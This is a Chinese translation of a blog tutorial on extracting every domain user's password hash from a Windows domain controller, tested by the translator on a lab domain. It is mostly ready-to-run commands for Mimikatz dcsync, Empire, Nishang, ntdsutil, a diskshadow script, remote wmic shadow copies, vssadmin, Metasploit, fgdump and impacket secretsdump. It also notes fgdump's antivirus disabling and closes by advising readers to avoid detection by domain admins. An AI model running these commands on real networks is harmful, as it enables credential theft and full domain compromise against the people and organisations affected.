> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/2527#toc-13)

原文地址：[https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/](https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/)  
ps: 上一篇提权那篇译文，backlion 说有实际操作就更好了，所以这篇我尽量都在自己 DC 上测试一遍，不当之处请指教。  
在渗透测试的过程中，当我们已经是域管权限时，就可以实现提取所有域内用户的密码哈希以进行离线破解和分析，这是非常常见的一个操作。这些哈希值存储在域控制器（NTDS.DIT​​）中的数据库文件中，并带有一些其他信息，如组中成员身份和用户。

`NTDS.DIT​​`文件经常被操作系统使用，因此无法直接复制到其他位置以提取信息。可以在 Windows 以下位置找到此文件：

```
C:\Windows\NTDS\NTDS.dit
```

ps: 这是我自己域控中的实例  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171010-5a8263e4-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171010-5a8263e4-988f-1.png)

可以使用各种骚操作来提取此文件或存储在其中的信息，但是大多数情况下都使用以下方法之一：

*   域控复制服务
*   原生 Windows 二进制文件
*   WMI

Mimikatz
--------

Mimikatz 有一个功能（dcsync），它利用目录复制服务（DRS）从 NTDS.DIT​​文件中检索密码哈希值。这样子解决了需要直接使用域控制器进行身份验证的需要，因为它可以从域管理员的上下文中获得执行权限。因此它是红队的基本操作，因为它不那么复杂。

```
lsadump::dcsync /domain:pentestlab.local /all /csv
```

ps：这是我在我本地 DC 中实际测试的图  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171010-5aa98f46-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171010-5aa98f46-988f-1.png)

> ps: [目录复制服务远程协议解释](https://msdn.microsoft.com/zh-cn/library/cc239691.aspx): 目录复制服务远程协议是用于 DC 之间复制和 AD 管理的 RPC 协议。该协议由一个名为 drsuapi 的 RPC 接口组成。  
> 对于客户端与 AD 轻型目录服务（AD/LDS）域控制器建立 RPC 连接，它需要知道计算机的名称以及 AD/LDS 域控制器正在侦听的 LDAP 端口的编号。首先，客户端建立与计算机上的端点映射器服务的连接。  
> 接下来，客户端枚举为所需接口 ID 注册的所有端点。最后，客户端选择其注释等于所需 AD/LDS 域控制器的 LDAP 端口号的端点。  
> 此协议适用于管理目录中的对象，以及目录服务的整体管理。

通过使用`/user`参数指定域用户名，`Mimikatz`可以 dump 此特定用户的所有帐户信息，包括其密码哈希。

```
lsadump::dcsync /domain:pentestlab.local /user:test
```

wing's DC  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171010-5ae7e4f8-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171010-5ae7e4f8-988f-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171011-5b53a3d2-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171011-5b53a3d2-988f-1.png)

或者直接在域控制器中执行 Mimikatz，通过 lsass.exe 进程 dump 哈希。

```
privilege::debug
lsadump::lsa /inject
```

将检索域内用户的密码哈希值。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171012-5bb7b16a-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171012-5bb7b16a-988f-1.png)

Empire
------

`PowerShell Empire`有两个模块，可以通过`DCSync`攻击 dump 域内哈希值。这两个模块都需要以域管理员权限执行，并且目标机器正在使用 Microsoft 复制服务。这些模块依赖于`Invoke-Mimikatz PowerShell`脚本来执行与`DCSync`相关的`Mimikatz`命令。以下模块将域内哈希值提取为类似于`Metasploit hashdump`命令输出的格式。

```
usemodule credentials/mimikatz/dcsync_hashdump
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171012-5becc0c6-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171012-5becc0c6-988f-1.png)  
用`DCSync`模块 dump 所有的帐户中指定的用户信息。  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171012-5c0f6fa4-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171012-5c0f6fa4-988f-1.png)  
将获得以下信息：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171012-5c350214-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171012-5c350214-988f-1.png)

Nishang
-------

[Nishang](https://github.com/samratashok/nishang) 是一个`PowerShell`框架，它让`redteam`和渗透测试人员能够对系统进行攻击性操作。Nishang 中的 [VSS 脚本](https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1)可以用于自动提取所需的文件：`NTDS.DIT​​，SAM和SYSTEM`。这些文件将被解压缩到当前工作目录或指定的任何其他文件夹中。

```
Import-Module .\Copy-VSS.ps1
Copy-VSS
Copy-VSS -DestinationDir C:\ShadowCopy\
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171013-5c7b79a6-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171013-5c7b79a6-988f-1.png)  
我操作完之后当前文件夹已经 dump 了。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171013-5cc1f034-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171013-5cc1f034-988f-1.png)

或者，可以通过现有的 Meterpreter 会话加载 PowerShell 扩展来执行脚本。

```
load powershell
powershell_import /root/Copy-VSS.ps1
powershell_execute Copy-VSS
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5cdb23ba-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5cdb23ba-988f-1.png)

也可以使用命令`powershell_shell`直接建立 PowerShell 会话，以便在在现有的 Meterpreter 会话中导入脚本后提取文件。

```
Copy-VSS
Copy-VSS -DestinationDir C:\Ninja
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5cec702a-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5cec702a-988f-1.png)

PowerSploit
-----------

[PowerSploit](https://github.com/PowerShellMafia/PowerSploit) 包含 PowerShell 脚本，该脚本利用卷复制服务创建可用于提取文件的新卷。

```
Import-Module .\VolumeShadowCopyTools.ps1
New-VolumeShadowCopy -Volume C:\
Get-VolumeShadowCopy
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5cfa4164-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5cfa4164-988f-1.png)  
或者，可以通过加载 PowerShell 扩展来从现有的 Meterpreter 会话执行它。

```
powershell_shell
New-VolumeShadowCopy -Volume C:\
Get-VOlumeShadowCopy
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5d0baaf8-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5d0baaf8-988f-1.png)  
然后，可以使用 copy 命令将文件从新卷复制到目标路径。

Invoke-DCSync
-------------

[Invoke–DCSync](https://xz.aliyun.com/tmp/VMwareDnD/681cf04a/Invoke-DCSync.ps1) 是 Nick Landers 利用 PowerView 开发的 powershell 脚本。  
Invoke-ReflectivePEInjection 和 PowerKatz 的 DLL wrapper 调用 Mimikatz 的 DCSync 方法检索哈希值。  
直接执行该函数将生成以下输出：

```
Invoke-DCSync
```

优秀，哈哈！  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5d3a589e-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5d3a589e-988f-1.png)

结果将格式化为四个表：Domain，User，RID 和 Hash。但是，使用参数 - PWDumpFormat 执行 Invoke-DCSync 将以以下格式检索哈希：

```
user：id：lm：ntlm :::
```

```
Invoke-DCSync -PWDumpFormat
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5d49afd8-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5d49afd8-988f-1.png)  
通过从现有的 Meterpreter 会话运行脚本，可以实现相同的输出。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5d5d9386-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171014-5d5d9386-988f-1.png)  
使用 PWDumpFormat：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171015-5d6f7c86-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171015-5d6f7c86-988f-1.png)

NTDSUTIL
--------

该 NTDSUTIL 是一个命令行工具，它是域控制器生态系统的一部分，其目的是为了使管理员能够访问和管理`Windows Active Directory`数据库。但是，渗透测试人员和 redteam 可以用它来拍摄现有 ntds.dit 文件的快照，该文件可以复制到新位置以进行离线分析和密码哈希的提取。

```
ntdsutil
activate instance ntds
ifm
create full C:\ntdsutil
quit
quit
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171015-5da943b2-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171015-5da943b2-988f-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171015-5dcbbd8e-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171015-5dcbbd8e-988f-1.png)

```
将生成两个新文件夹：Active Directory和Registry。NTDS.DIT​​文件将保存在Active Directory中，SAM和SYSTEM文件将保存到Registry文件夹中。
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171015-5de7ab8e-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171015-5de7ab8e-988f-1.png)

DiskShadow
----------

DiskShadow 是 Microsoft 签名的二进制文件，用于协助管理员执行与卷复制服务（VSS）相关的操作。最初 bohops 在他的博客中写到了这个二进制文件。这个二进制文件有两个交互式和脚本模式，因此可以使用一个脚本文件，它将包含自动执行 NTDS.DIT​​提取过程所需的所有命令。脚本文件可以包含以下行，以便创建新的卷影副本，装入新驱动器，执行复制命令并删除卷影副本。

```
set context persistent nowriters
add volume c: alias someAlias
create
expose %someAlias% z:
exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
delete shadows volume %someAlias%
reset
```

需要注意一点，`DiskShadow`二进制文件需要从`C\Windows\System32`路径执行。如果从另一个路径调用它，脚本将无法正确执行。

```
diskshadow.exe /s c:\diskshadow.txt
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171015-5dff596e-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171015-5dff596e-988f-1.png)  
直接从解释器运行以下命令将列出系统的所有可用卷影副本。

```
diskshadow
LIST SHADOWS ALL
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e1c9470-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e1c9470-988f-1.png)  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e2dbe6c-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e2dbe6c-988f-1.png)  
`SYSTEM`注册表配置单元也应该复制，因为它包含解密 NTDS 文件内容的密钥。

```
reg.exe save hklm\system c:\exfil\system.bak
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e41a936-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e41a936-988f-1.png)

WMI
---

Sean Metcalf 在他的[博客](https://adsecurity.org/?p=2398)中证明了，可以通过 WMI 远程提取 NTDS.DIT​​和 SYSTEM 文件。此技术使用`vssadmin`二进制文件来创建卷的副本。

```
wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e4d0146-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e4d0146-988f-1.png)  
然后，它远程执行复制命令，以便将卷影副本中的 NTDS.DIT​​文件解压缩到目标系统上的另一个目录中。

```
wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit 2>&1"
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e59d402-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e59d402-988f-1.png)  
这同样适用于 SYSTEM 文件。

```
wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM\ C:\temp\SYSTEM.hive 2>&1"
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e659fd0-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e659fd0-988f-1.png)  
然后，解压缩的文件可以从域控制器传输到另一个 Windows 系统，然后 dump 域内用户密码哈希值。

```
PS C:\Users\test.PENTESTLAB> copy \\10.0.0.1\c$\temp\ntds.dit C:\temp
PS C:\Users\test.PENTESTLAB> copy \\10.0.0.1\c$\temp\SYSTEM.hive C:\temp
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e6f6b00-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e6f6b00-988f-1.png)  
如果已生成金票据，则可以使用它通过 Kerberos 与域控制器进行身份验证，而不是凭据。

VSSADMIN
--------

卷影拷贝服务是 Windows 命令行实用的程序，使管理员可以备份计算机，卷和文件，即使它们正在被操作系统使用。卷影复制作为服务运行，并要求将文件系统格式化为 NTFS，默认情况下所有现代操作系统都是如此。从 Windows 命令提示符执行以下操作将创建 C：驱动器的快照，以便用户通常无法访问这些文件以将其复制到另一个位置（本地文件夹，网络文件夹或可移动设备）。

```
vssadmin create shadow /for=C:
```

ps:  
关于 Volume Shadow Copy 服务：  
它是管理及执行用于备份和其他目的的磁碟区卷影。如果这个服务被停止，卷影将无法用于备份，备份可能会失败。如果这个服务被停用，依存它的服务无法启动。  
这一服务唯一的缺点是你需要为每一个卷影留出更多的磁盘空间，因为你必须在某处存储这些拷贝。  
它主要是用来备份数据库之类的数据，个人电脑确实一般用不上它。可以放心禁用！

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e7be114-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e7be114-988f-1.png)

由于 C：驱动器中的所有文件都已复制到另一个位置（HarddiskVolumeShadowCopy1），因此它们不会被操作系统直接使用，因此可以访问他并且复制到另一个位置。命令副本将 NTDS.DIT 和 SYSTEM 文件复制到名为 ShadowCopy 的本地驱动器上的新创建文件夹中。

```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e876886-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e876886-988f-1.png)  
需要将这些文件从域控制器复制到另一个主机以进行进一步处理。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e94e646-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171016-5e94e646-988f-1.png)

vssown
------

与 vssadmin 程序类似，Tim Tomes 开发了 [vssown](https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs)，它是一个可视化的基本脚本，可以创建和删除卷影副本，从卸载的卷影副本运行任意可执行文件，以及启动和停止卷影复制服务。

```
cscript vssown.vbs /start
cscript vssown.vbs /create c
cscript vssown.vbs /list
cscript vssown.vbs /delete
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5ea8bfb8-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5ea8bfb8-988f-1.png)  
可以使用命令复制所需的文件。

```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy11\windows\ntds\ntds.dit C:\vssown
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy11\windows\system32\config\SYSTEM C:\vssown
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy11\windows\system32\config\SAM C:\vssown
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5eb5e030-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5eb5e030-988f-1.png)

Metasploit
----------

Metasploit 框架有一个模块，它通过服务器消息块（SMB）服务直接与域控制器进行身份验证，创建系统驱动器的卷影副本，并将 NTDS.DIT​​和 SYSTEM 配置单元的副本下载到 Metasploit 目录中。这些文件可以与 impacket 等其他工具一起使用，这些工​​具可以进行 `active directory`哈希密码的提取。

```
auxiliary/admin/smb/psexec_ntdsgrab
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5eda5186-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5eda5186-988f-1.png)  
还有一个后渗透模块，可以链接到现有的 Meterpreter 会话，以便通过 ntdsutil 方法检索域哈希。

```
windows/gather/credentials/domain_hashdump
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5f0213c4-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5f0213c4-988f-1.png)

或者，如果已经拿到域控制器的现有 Meterpreter 会话，则可以使用命令 hashdump。但是，此方法不被认为是安全的，因为它可能会使域控崩掉。

```
hashdump
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5f1d30b4-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5f1d30b4-988f-1.png)

fgdump
------

[fgdump](http://www.foofus.net/fizzgig/fgdump/fgdump-2.1.0-exeonly.zip) 是一个比较老的可执行文件，可提取的 LanMan 和 NTLM 的密码哈希值。如果已获取本地管理员凭据，则可以在本地或远程执行。在执行期间，fgdump 将尝试禁用可能在系统上运行的防病毒软件，如果成功，则会将所有数据写入两个文件中。如果存在防病毒或端点解决方案，则不应该将 fgdump 用作 dump 密码哈希的方法以避免检测，因为大多数防病毒公司（包括 Microsoft 的 Windows Defender）都会对将它 kill 掉。

```
fgdump.exe
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5f307fd4-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171017-5f307fd4-988f-1.png)

可以通过检查. pwdump 文件的内容来 get 密码哈希值。

```
type 127.0.0.1.pwdump
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171018-5f3d4c6e-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171018-5f3d4c6e-988f-1.png)

NTDS 提取
-------

[Impacket](https://github.com/CoreSecurity/impacket) 是一组 python 脚本，可用于执行各种任务，包括提取 NTDS 文件的内容。`impacket-secretsdump`模块需要系统和 NTDS 数据库文件.

```
impacket-secretsdump -system /root/SYSTEM -ntds /root/ntds.dit LOCAL
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171018-5f58d240-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171018-5f58d240-988f-1.png)

此外，impacket 可以通过使用计算机帐户及其哈希进行身份验证然后从 NTDS.DIT​​文件远程 dump 域内所有密码哈希。

```
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171018-5f7b4348-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171018-5f7b4348-988f-1.png)

作为 impacket 的替代解决方案，[NTDSDumpEx](https://github.com/zcgonvh/NTDSDumpEx) 二进制文件可以从 Windows 主机中提取域密码哈希值。

```
NTDSDumpEx.exe -d ntds.dit -s SYSTEM.hive
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171018-5f982364-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171018-5f982364-988f-1.png)

还有一个 shell 脚本 [adXtract](https://github.com/LordNem/adXtract)，它可以将用户名和密码哈希导出为一种格式，可以使用常见密码破解程序进行破解，例如 John the Ripper 和 Hashcat。

```
./adXtract.sh /root/ntds.dit /root/SYSTEM pentestlab
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171018-5fbcbeea-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171018-5fbcbeea-988f-1.png)

该脚本将所有信息写入项目名称下的各种文件中，当数据库文件 NTDS 的解密完成后，将用户列表和密码哈希值导出到控制台中。该脚本将提供有关域用户的大量信息，如下所示。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171019-5fe2dac6-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171019-5fe2dac6-988f-1.png)

密码哈希将以下列格式显示。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20180805171019-60097d02-988f-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180805171019-60097d02-988f-1.png)

总结
--

操作一遍之后，操作确实很多，个人愚见就是，不管哪种方法，都尽量别被域管发现。

译者：[wing](https://evilwing.me/)